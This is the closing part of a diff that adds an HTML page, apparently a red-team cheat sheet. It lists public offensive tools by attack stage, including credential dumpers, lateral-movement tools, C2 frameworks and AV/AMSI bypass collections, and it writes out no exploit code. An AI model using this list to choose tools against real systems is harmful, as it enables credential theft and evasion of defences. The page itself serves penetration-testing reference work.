+				<li><a href="https://github.com/byt3bl33d3r/SprayingToolkit" target="_blank"><strong>SprayingToolkit</strong></a> - Password spraying tools</li>
+				<li><a href="https://github.com/sensepost/ruler" target="_blank"><strong>Ruler</strong></a> - Exchange/O365 exploitation</li>
+				<li><a href="https://github.com/ZeroPointSecurity/PhishInSuits" target="_blank"><strong>PhishInSuits</strong></a> - OAuth phishing tool</li>
+				<li><a href="https://github.com/sevagas/macro_pack" target="_blank"><strong>macro_pack</strong></a> - Office document payload generator</li>
+			</ul>
+
+			<h3>Privilege Escalation - Windows</h3>
+			<ul>
+				<li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank"><strong>WinPEAS</strong></a> - Windows privilege escalation scanner</li>
+				<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank"><strong>PowerUp</strong></a> - PowerShell privesc checks</li>
+				<li><a href="https://github.com/GhostPack/Seatbelt" target="_blank"><strong>Seatbelt</strong></a> - Windows security enumeration</li>
+				<li><a href="https://github.com/itm4n/PrintSpoofer" target="_blank"><strong>PrintSpoofer</strong></a> - SeImpersonatePrivilege exploit</li>
+				<li><a href="https://github.com/BeichenDream/GodPotato" target="_blank"><strong>GodPotato</strong></a> - Potato privilege escalation</li>
+				<li><a href="https://github.com/CCob/SweetPotato" target="_blank"><strong>SweetPotato</strong></a> - Service account to SYSTEM</li>
+				<li><a href="https://github.com/ohpe/juicy-potato" target="_blank"><strong>JuicyPotato</strong></a> - COM object privilege escalation</li>
+			</ul>
+
+			<h3>Privilege Escalation - Linux</h3>
+			<ul>
+				<li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank"><strong>LinPEAS</strong></a> - Linux privilege escalation scanner</li>
+				<li><a href="https://github.com/DominicBreuker/pspy" target="_blank"><strong>pspy</strong></a> - Linux process monitoring</li>
+				<li><a href="https://github.com/rebootuser/LinEnum" target="_blank"><strong>LinEnum</strong></a> - Linux enumeration script</li>
+				<li><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank"><strong>linux-exploit-suggester</strong></a> - Kernel exploit suggestions</li>
+				<li><a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank"><strong>linux-exploit-suggester-2</strong></a> - Next-gen exploit suggester</li>
+			</ul>
+
+			<h3>Post-Exploitation & Credential Access</h3>
+			<ul>
+				<li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank"><strong>Mimikatz</strong></a> - Windows credential extraction</li>
+				<li><a href="https://github.com/GhostPack/Rubeus" target="_blank"><strong>Rubeus</strong></a> - Kerberos abuse toolkit</li>
+				<li><a href="https://github.com/fortra/impacket" target="_blank"><strong>Impacket</strong></a> - Network protocol implementations</li>
+				<li><a href="https://github.com/GhostPack/SharpDPAPI" target="_blank"><strong>SharpDPAPI</strong></a> - DPAPI credential extraction</li>
+				<li><a href="https://github.com/skelsec/pypykatz" target="_blank"><strong>pypykatz</strong></a> - Python Mimikatz implementation</li>
+				<li><a href="https://github.com/login-securite/lsassy" target="_blank"><strong>lsassy</strong></a> - Remote LSASS credential dump</li>
+				<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank"><strong>LaZagne</strong></a> - Multi-platform credential recovery</li>
+			</ul>
+
+			<h3>Lateral Movement</h3>
+			<ul>
+				<li><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank"><strong>CrackMapExec</strong></a> - Swiss army knife for AD pentesting</li>
+				<li><a href="https://github.com/Pennyw0rth/NetExec" target="_blank"><strong>NetExec</strong></a> - CrackMapExec successor</li>
+				<li><a href="https://github.com/Hackndo/lsassy" target="_blank"><strong>lsassy</strong></a> - Remote credential extraction</li>
+				<li><a href="https://github.com/Hackplayers/evil-winrm" target="_blank"><strong>Evil-WinRM</strong></a> - WinRM shell for pentesting</li>
+				<li><a href="https://github.com/0x09AL/RdpThief" target="_blank"><strong>RdpThief</strong></a> - RDP credential extraction</li>
+				<li><a href="https://github.com/cube0x0/SharpMapExec" target="_blank"><strong>SharpMapExec</strong></a> - C# network tool</li>
+			</ul>
+
+			<h3>Active Directory</h3>
+			<ul>
+				<li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank"><strong>BloodHound</strong></a> - AD relationship analysis</li>
+				<li><a href="https://github.com/fox-it/BloodHound.py" target="_blank"><strong>BloodHound.py</strong></a> - Python BloodHound collector</li>
+				<li><a href="https://github.com/ly4k/Certipy" target="_blank"><strong>Certipy</strong></a> - AD CS attack tool</li>
+				<li><a href="https://github.com/GhostPack/Certify" target="_blank"><strong>Certify</strong></a> - AD CS enumeration</li>
+				<li><a href="https://github.com/zer1t0/certi" target="_blank"><strong>Certi</strong></a> - AD CS tool</li>
+				<li><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank"><strong>PowerSploit</strong></a> - PowerShell post-exploitation</li>
+				<li><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank"><strong>Powermad</strong></a> - PowerShell MachineAccountQuota</li>
+				<li><a href="https://github.com/dirkjanm/ldapdomaindump" target="_blank"><strong>ldapdomaindump</strong></a> - LDAP domain enumeration</li>
+			</ul>
+
+			<h3>C2 Frameworks</h3>
+			<ul>
+				<li><a href="https://github.com/BishopFox/sliver" target="_blank"><strong>Sliver</strong></a> - Open-source C2 framework</li>
+				<li><a href="https://github.com/HavocFramework/Havoc" target="_blank"><strong>Havoc</strong></a> - Modern C2 framework</li>
+				<li><a href="https://github.com/cobbr/Covenant" target="_blank"><strong>Covenant</strong></a> - .NET C2 framework</li>
+				<li><a href="https://github.com/BC-SECURITY/Empire" target="_blank"><strong>Empire</strong></a> - PowerShell/Python post-exploitation</li>
+				<li><a href="https://github.com/t3l3machus/Villain" target="_blank"><strong>Villain</strong></a> - Windows/Linux C2 framework</li>
+				<li><a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank"><strong>SILENTTRINITY</strong></a> - Async C2 framework</li>
+				<li><a href="https://github.com/nettitude/PoshC2" target="_blank"><strong>PoshC2</strong></a> - C2 with proxy support</li>
+			</ul>
+
+			<h3>Evasion & AV Bypass</h3>
+			<ul>
+				<li><a href="https://github.com/optiv/ScareCrow" target="_blank"><strong>ScareCrow</strong></a> - Payload creation for evasion</li>
+				<li><a href="https://github.com/klezVirus/inceptor" target="_blank"><strong>Inceptor</strong></a> - Template-based AV evasion</li>
+				<li><a href="https://github.com/Flangvik/SharpCollection" target="_blank"><strong>SharpCollection</strong></a> - Pre-compiled .NET tools</li>
+				<li><a href="https://github.com/rasta-mouse/ThreatCheck" target="_blank"><strong>ThreatCheck</strong></a> - AV signature detection</li>
+				<li><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank"><strong>AMSI Bypass</strong></a> - AMSI bypass collection</li>
+				<li><a href="https://github.com/Arvanaghi/CheckPlease" target="_blank"><strong>CheckPlease</strong></a> - Sandbox evasion modules</li>
+			</ul>
+
+			<h3>Web Application Testing</h3>
+			<ul>
+				<li><a href="https://portswigger.net/burp" target="_blank"><strong>Burp Suite</strong></a> - Web security testing platform</li>
+				<li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank"><strong>sqlmap</strong></a> - Automated SQL injection</li>
+				<li><a href="https://github.com/ffuf/ffuf" target="_blank"><strong>ffuf</strong></a> - Fast web fuzzer</li>
+				<li><a href="https://github.com/maurosoria/dirsearch" target="_blank"><strong>dirsearch</strong></a> - Web path scanner</li>
+				<li><a href="https://github.com/wpscanteam/wpscan" target="_blank"><strong>WPScan</strong></a> - WordPress vulnerability scanner</li>
+				<li><a href="https://github.com/commixproject/commix" target="_blank"><strong>Commix</strong></a> - Command injection exploiter</li>
+			</ul>
+
+			<div class="tags">
+				<a href="#" class="tag">Red Team</a>
+				<a href="#" class="tag">Penetration Testing</a>
+				<a href="#" class="tag">Active Directory</a>
+				<a href="#" class="tag">Windows</a>
+				<a href="#" class="tag">Linux</a>
+				<a href="#" class="tag">Cheat Sheet</a>
+				<a href="#" class="tag">MITRE ATT&CK</a>
+			</div>
+
+			<div class="share-section">
+				<h4>Share this article</h4>
+				<div class="share-buttons">
+					<a href="#" class="share-btn twitter" onclick="shareTwitter()" title="Share on Twitter">
+						<i class="fab fa-twitter"></i>
+					</a>
+					<a href="#" class="share-btn linkedin" onclick="shareLinkedIn()" title="Share on LinkedIn">
+						<i class="fab fa-linkedin-in"></i>
+					</a>
+					<div class="share-btn copy" onclick="copyLink()" title="Copy link">
+						<i class="fas fa-link"></i>
+					</div>
+				</div>
+			</div>
+
+			<div class="author-box">
+				<div class="author-avatar">SK</div>
+				<div class="author-info">
+					<h4>Shravan Kumar Sheri</h4>
+					<p>Security Engineer & Researcher specializing in offensive security, red teaming, and exploit development.</p>
+				</div>
+			</div>
+		</div>
+	</article>
+
+	<footer>
+		<div class="container">
+			<p>&copy; 2025 Shravan Kumar Sheri - All Rights Reserved</p>
+		</div>
+	</footer>
+
+	<script>
+		window.addEventListener('scroll', () => {
+			const scrollTop = document.documentElement.scrollTop;
+			const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+			const progress = (scrollTop / scrollHeight) * 100;
+			document.getElementById('progressBar').style.width = progress + '%';
+		});
+
+		function shareTwitter() {
+			const url = encodeURIComponent(window.location.href);
+			const text = encodeURIComponent(document.title);
+			window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank');
+		}
+
+		function shareLinkedIn() {
+			const url = encodeURIComponent(window.location.href);
+			window.open(`https://www.linkedin.com/sharing/share-offsite/?url=${url}`, '_blank');
+		}
+
+		function copyLink() {
+			navigator.clipboard.writeText(window.location.href).then(() => {
+				alert('Link copied to clipboard!');
+			});
+		}
+
+		document.querySelectorAll('.toc a').forEach(link => {
+			link.addEventListener('click', function(e) {
+				e.preventDefault();
+				const targetId = this.getAttribute('href').slice(1);
+				const target = document.getElementById(targetId);
+				if (target) {
+					target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+				}
+			});
+		});
+	</script>
+</body>
+</html>
